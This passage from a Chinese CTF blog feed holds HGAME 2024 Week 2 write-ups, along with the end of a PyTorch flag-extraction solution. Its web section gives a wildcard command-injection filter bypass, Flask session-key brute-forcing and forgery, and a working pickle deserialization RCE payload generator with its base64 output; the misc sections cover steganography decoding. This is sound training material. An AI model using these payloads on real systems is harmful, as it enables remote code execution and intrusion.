class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><br><span class="hljs-comment"># 重新定义模型类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyModel</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(MyModel, self).__init__()<br>        <span class="hljs-comment"># 卷积层</span><br>        self.conv1 = nn.Conv2d(<br>            in_channels=<span class="hljs-number">3</span>, out_channels=<span class="hljs-number">16</span>, kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">1</span>, padding=<span class="hljs-number">1</span><br>        )<br>        self.conv2 = nn.Conv2d(<br>            in_channels=<span class="hljs-number">16</span>, out_channels=<span class="hljs-number">32</span>, kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">1</span>, padding=<span class="hljs-number">1</span><br>        )<br>        <span class="hljs-comment"># 全连接层</span><br>        self.fc = nn.Linear(<span class="hljs-number">32</span> * <span class="hljs-number">32</span> * <span class="hljs-number">32</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment"># 假设输入尺寸是32x32，输出类别数为10</span><br>        <span class="hljs-comment"># 添加额外的键</span><br>        self.flag = nn.Parameter(torch.zeros(<span class="hljs-number">54</span>))  <span class="hljs-comment"># 假设flag是一个标量张量</span><br>        self.hint = nn.Parameter(torch.zeros(<span class="hljs-number">64</span>))  <span class="hljs-comment"># 假设hint是一个标量张量</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = torch.relu(self.conv1(x))<br>        x = torch.relu(self.conv2(x))<br>        x = x.view(x.size(<span class="hljs-number">0</span>), -<span class="hljs-number">1</span>)  <span class="hljs-comment"># 将张量展平成一维向量</span><br>        x = self.fc(x)<br>        <span class="hljs-keyword">return</span> x<br><br><br><span class="hljs-comment"># 创建新的模型实例</span><br>model = MyModel()<br><br><span class="hljs-comment"># 加载.pth文件到模型中</span><br>path = <span class="hljs-string">&quot;easy.pth&quot;</span>  <span class="hljs-comment"># 替换成你的.pth文件的路径</span><br>checkpoint = torch.load(path)<br><br><span class="hljs-comment"># 从检查点中提取参数并加载到模型中</span><br>model.load_state_dict(checkpoint)<br><br><span class="hljs-built_in">print</span>(checkpoint[<span class="hljs-string">&quot;hint&quot;</span>])<br><br><span class="hljs-built_in">print</span>(checkpoint[<span class="hljs-string">&quot;flag&quot;</span>]) <br></code></pre></td></tr></table></figure><p>得到</p><p><img src="/posts/14e77824/image-20240301215630685.png" alt="image-20240301215630685"></p><p>转成ascii得</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">hint: ZzYyXxAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWw0123456789+/<br>flag: LidUJ3fQM2FVJoxpDwLvDyF3DwpPdwxOEgbQJoxnEgdnJgnojoZ5mF<br></code></pre></td></tr></table></figure><p>使用 <a href="https://cyberchef.org/">Cyberchef</a></p><p><img src="/posts/14e77824/image-20240301215818418.png" alt="image-20240301215818418"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME-2024-WEEK-2 WriteUps</title>
    <link href="/posts/feba5816/"/>
    <url>/posts/feba5816/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h2><p>原本以为 xss ，后来尝试发现是内敛执行</p><p><img src="/posts/feba5816/image-20240221231654973.png" alt="image-20240221231654973"></p><p>尝试直接 cat 发现 waf了</p><p>这里使用通配符绕过</p><p>CMD: <code>/???/c?t /fl?g_is_here/?l?g_??????</code></p><p><img src="/posts/feba5816/image-20240221232119179.png" alt="image-20240221232119179"></p><h2 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezone<br><br>currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br><br>app = Flask(__name__)<br><span class="hljs-comment"># Tips: Try to crack this first ↓</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<br><span class="hljs-built_in">print</span>(currentTime)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <br>    <span class="hljs-comment"># For POST requests from admin</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>        <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>        userdata=pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> userdata<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure><p>根据 Tips 猜测 currentTime 为环境启动时间，秒数遍历一下使用<code>flask_session_cookie_manager</code>验证得到 SECRET_KEY</p><p><img src="/posts/feba5816/image-20240221233312801.png" alt="image-20240221233312801"></p><p>然后伪造 SECRET_KEY 使 username 为 admin</p><p><img src="/posts/feba5816/image-20240221233432146.png" alt="image-20240221233432146"></p><p>然后简单的 pickle 命令执行一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">genpoc</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        cmd = <span class="hljs-string">&quot;ls&quot;</span>  <span class="hljs-comment"># 要执行的命令</span><br>        s = <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="hljs-built_in">format</span>(cmd)<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (s,))  <span class="hljs-comment"># reduce函数必须返回元组或字符串</span><br><br><br>poc = pickle.dumps(genpoc())<br><span class="hljs-built_in">print</span>(base64.b64encode(poc)) <br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs base64">gASVPwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwjX19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCmUhZRSlC4=<br></code></pre></td></tr></table></figure><p><img src="/posts/feba5816/image-20240221234808147.png" alt="image-20240221234808147"></p><p><code>cat /flag</code> 得到</p><p><img src="/posts/feba5816/image-20240221234856822.png" alt="image-20240221234856822"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a>ek1ng_want_girlfriend</h2><p>点开发现请求图片，点击 Response</p><p><img src="/posts/feba5816/image-20240221235056870.png" alt="image-20240221235056870"></p><p>可以看出数据为图片</p><p><img src="/posts/feba5816/image-20240221235419338.png" alt="image-20240221235419338"></p><p>得到 flag</p><p><img src="/posts/feba5816/image-20240221235646520.png" alt="image-20240221235646520"></p><h2 id="ezWord"><a href="#ezWord" class="headerlink" title="ezWord"></a>ezWord</h2><p>好麻烦，晕</p><p>把 docx 后缀改为 zip 打开</p><p><img src="/posts/feba5816/image-20240222000304893.png" alt="image-20240222000304893"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 恭喜.txt">恭喜你找到了这些东西，现在你离flag只差解开这个新的压缩包，然后对压缩包里的东西进行两层解密就能获得flag了。压缩包的密码和我放在这的两张图片有关。<br></code></pre></td></tr></table></figure><p>查阅资料猜测是盲水印加密</p><p>使用工具<a href="https://github.com/chishaxie/BlindWaterMark">chishaxie&#x2F;BlindWaterMark: 盲水印 by python (github.com)</a></p><p>作者给的 requirements.txt 我弄不好</p><p>这里使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install opencv-python<br>python -m pip install matplotlib<br></code></pre></td></tr></table></figure><p><img src="/posts/feba5816/image-20240222002940423.png" alt="image-20240222002940423"></p><p><img src="/posts/feba5816/result.png" alt="result"></p><p>得到压缩包密码 <code>T1hi3sI4sKey</code></p><p>得到</p><details>    <summary>secret.txt</summary><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs txt">    Dear E-Commerce professional ; This letter was specially<br>selected to be sent to you . We will comply with all<br>removal requests ! This mail is being sent in compliance<br>with Senate bill 1620 ; Title 3 ; Section 308 ! This<br>is not a get rich scheme ! Why work for somebody else<br>when you can become rich in 27 MONTHS . Have you ever<br>noticed more people than ever are surfing the web and<br>more people than ever are surfing the web . Well, now<br>is your chance to capitalize on this ! WE will help<br>YOU use credit cards on your website plus turn your<br>business into an E-BUSINESS . You are guaranteed to<br>succeed because we take all the risk ! But don&#x27;t believe<br>us . Ms Simpson who resides in Maine tried us and says<br>&quot;I&#x27;ve been poor and I&#x27;ve been rich - rich is better&quot;<br>. We are a BBB member in good standing ! We urge you<br>to contact us today for your own future financial well-being<br>. Sign up a friend and you&#x27;ll get a discount of 50%<br>. Thank-you for your serious consideration of our offer<br>! Dear Friend ; This letter was specially selected<br>to be sent to you ! We will comply with all removal<br>requests . This mail is being sent in compliance with<br>Senate bill 2316 ; Title 8 , Section 301 ! Do NOT confuse<br>us with Internet scam artists . Why work for somebody<br>else when you can become rich as few as 24 WEEKS !<br>Have you ever noticed more people than ever are surfing<br>the web plus how many people you know are on the Internet<br>. Well, now is your chance to capitalize on this .<br>We will help you decrease perceived waiting time by<br>200% and turn your business into an E-BUSINESS . You<br>are guaranteed to succeed because we take all the risk<br>. But don&#x27;t believe us . Mrs Simpson of Illinois tried<br>us and says &quot;Now I&#x27;m rich many more things are possible&quot;<br>! We assure you that we operate within all applicable<br>laws ! Do not delay - order today . Sign up a friend<br>and your friend will be rich too . Warmest regards<br>! Dear Sir or Madam ; Especially for you - this hot<br>information . We will comply with all removal requests<br>! This mail is being sent in compliance with Senate<br>bill 1916 ; Title 2 , Section 301 ! THIS IS NOT MULTI-LEVEL<br>MARKETING ! Why work for somebody else when you can<br>become rich in 89 days . Have you ever noticed most<br>everyone has a cellphone plus most everyone has a cellphone<br>! Well, now is your chance to capitalize on this !<br>WE will help YOU sell more &amp; SELL MORE . You can begin<br>at absolutely no cost to you . But don&#x27;t believe us<br>. Mr Jones of Minnesota tried us and says &quot;I was skeptical<br>but it worked for me&quot; ! We assure you that we operate<br>within all applicable laws ! We beseech you - act now<br>. Sign up a friend and you&#x27;ll get a discount of 90%<br>. Thanks . Dear Cybercitizen ; Your email address has<br>been submitted to us indicating your interest in our<br>newsletter . If you are not interested in our publications<br>and wish to be removed from our lists, simply do NOT<br>respond and ignore this mail ! This mail is being sent<br>in compliance with Senate bill 2016 , Title 2 , Section<br>304 . This is different than anything else you&#x27;ve seen<br>! Why work for somebody else when you can become rich<br>in 48 weeks ! Have you ever noticed more people than<br>ever are surfing the web plus people love convenience<br>! Well, now is your chance to capitalize on this .<br>WE will help YOU deliver goods right to the customer&#x27;s<br>doorstep &amp; turn your business into an E-BUSINESS .<br>You can begin at absolutely no cost to you . But don&#x27;t<br>believe us . Ms Anderson who resides in New York tried<br>us and says &quot;My only problem now is where to park all<br>my cars&quot; ! We are a BBB member in good standing . If<br>not for you then for your LOVED ONES - act now ! Sign<br>up a friend and you&#x27;ll get a discount of 20% ! God<br>Bless . Dear Colleague , Your email address has been<br>submitted to us indicating your interest in our publication<br>. If you no longer wish to receive our publications<br>simply reply with a Subject: of &quot;REMOVE&quot; and you will<br>immediately be removed from our mailing list . This<br>mail is being sent in compliance with Senate bill 2416<br>, Title 9 ; Section 308 ! This is NOT unsolicited bulk<br>mail . Why work for somebody else when you can become<br>rich within 24 MONTHS ! Have you ever noticed most<br>everyone has a cellphone and people love convenience<br>. Well, now is your chance to capitalize on this !<br>We will help you decrease perceived waiting time by<br>190% and sell more ! The best thing about our system<br>is that it is absolutely risk free for you ! But don&#x27;t<br>believe us . Mrs Anderson of Indiana tried us and says<br>&quot;Now I&#x27;m rich, Rich, RICH&quot; . This offer is 100% legal<br>. So make yourself rich now by ordering immediately<br>. Sign up a friend and your friend will be rich too<br>. God Bless ! Dear Colleague ; We know you are interested<br>in receiving amazing information ! If you are not interested<br>in our publications and wish to be removed from our<br>lists, simply do NOT respond and ignore this mail !<br>This mail is being sent in compliance with Senate bill<br>1619 , Title 7 , Section 303 ! This is not multi-level<br>marketing . Why work for somebody else when you can<br>become rich within 37 days ! Have you ever noticed<br>nobody is getting any younger plus people love convenience<br>! Well, now is your chance to capitalize on this .<br>WE will help YOU decrease perceived waiting time by<br>140% plus deliver goods right to the customer&#x27;s doorstep<br>. You can begin at absolutely no cost to you . But<br>don&#x27;t believe us ! Mrs Simpson of Illinois tried us<br>and says &quot;I was skeptical but it worked for me&quot; . We<br>are licensed to operate in all states ! Because the<br>Internet operates on &quot;Internet time&quot; you must make<br>a commitment soon ! Sign up a friend and you get half<br>off ! Thank-you for your serious consideration of our<br>offer . Dear Friend ; We know you are interested in<br>receiving amazing info ! We will comply with all removal<br>requests . This mail is being sent in compliance with<br>Senate bill 2716 , Title 5 , Section 303 ! This is<br>not a get rich scheme . Why work for somebody else<br>when you can become rich within 52 days ! Have you<br>ever noticed how many people you know are on the Internet<br>and the baby boomers are more demanding than their<br>parents ! Well, now is your chance to capitalize on<br>this . WE will help YOU decrease perceived waiting<br>time by 170% and turn your business into an E-BUSINESS<br>. You are guaranteed to succeed because we take all<br>the risk ! But don&#x27;t believe us ! Mrs Anderson who<br>resides in Alabama tried us and says &quot;Now I&#x27;m rich,<br>Rich, RICH&quot; ! We are a BBB member in good standing<br>. So make yourself rich now by ordering immediately<br>! Sign up a friend and you get half off ! Thanks .<br>Dear Salaryman ; Especially for you - this red-hot<br>news ! We will comply with all removal requests . This<br>mail is being sent in compliance with Senate bill 1618<br>, Title 4 , Section 308 . THIS IS NOT MULTI-LEVEL MARKETING<br>. Why work for somebody else when you can become rich<br>inside 27 days ! Have you ever noticed nearly every<br>commercial on television has a .com on in it &amp; nearly<br>every commercial on television has a .com on in it<br>! Well, now is your chance to capitalize on this !<br>WE will help YOU decrease perceived waiting time by<br>180% plus turn your business into an E-BUSINESS . You<br>can begin at absolutely no cost to you ! But don&#x27;t<br>believe us ! Prof Ames who resides in Washington tried<br>us and says &quot;I was skeptical but it worked for me&quot;<br>. We assure you that we operate within all applicable<br>laws ! We implore you - act now . Sign up a friend<br>and you&#x27;ll get a discount of 10% . Thank-you for your<br>serious consideration of our offer ! Dear Friend ;<br>This letter was specially selected to be sent to you<br>! If you no longer wish to receive our publications<br>simply reply with a Subject: of &quot;REMOVE&quot; and you will<br>immediately be removed from our club ! This mail is<br>being sent in compliance with Senate bill 1622 , Title<br>7 ; Section 303 ! Do NOT confuse us with Internet scam<br>artists . Why work for somebody else when you can become<br>rich in 10 weeks ! Have you ever noticed people will<br>do almost anything to avoid mailing their bills &amp; people<br>love convenience ! Well, now is your chance to capitalize<br>on this . WE will help YOU turn your business into<br>an E-BUSINESS &amp; SELL MORE . You can begin at absolutely<br>no cost to you ! But don&#x27;t believe us . Mr Ames of<br>Louisiana tried us and says &quot;Now I&#x27;m rich, Rich, RICH&quot;<br>. We are licensed to operate in all states . We BESEECH<br>you - act now . Sign up a friend and you&#x27;ll get a discount<br>of 50% ! Thank-you for your serious consideration of<br>our offer .<br></code></pre></td></tr></table></figure></details><p>眼熟</p><p>使用<a href="https://www.spammimic.com/decode.cgi">spammimic - decoded</a>解密</p><p>得到 <code>籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆</code></p><p>大佬给的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, bytes_to_long<br><br>s = <span class="hljs-string">&quot;籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆&quot;</span><br>poss = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">bytes</span>([i]).decode().isprintable():<br>        poss += <span class="hljs-built_in">bytes</span>([i]).decode()<br>flag = <span class="hljs-string">&quot;h&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s) - <span class="hljs-number">1</span>):<br>    tmp = bytes_to_long(s[i + <span class="hljs-number">1</span>].encode()) - bytes_to_long(s[i].encode())<br>    <span class="hljs-built_in">print</span>(tmp)<br>    <span class="hljs-comment"># print(tmp+flag[i])</span><br>    flag += poss[(tmp + poss.find(flag[i])) % <span class="hljs-number">96</span>]<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><p>or</p><p><a href="https://www.dcode.fr/rot8000-cipher">ROT8000 Cipher - Online Decoder, Encoder, Solver, Translator (dcode.fr)</a></p><p><img src="/posts/feba5816/image-20240222004305418.png" alt="image-20240222004305418"></p><h2 id="龙之舞"><a href="#龙之舞" class="headerlink" title="龙之舞"></a>龙之舞</h2><p>之前遇到过</p><p>拼接二维码</p><p><img src="data:image/png;base64,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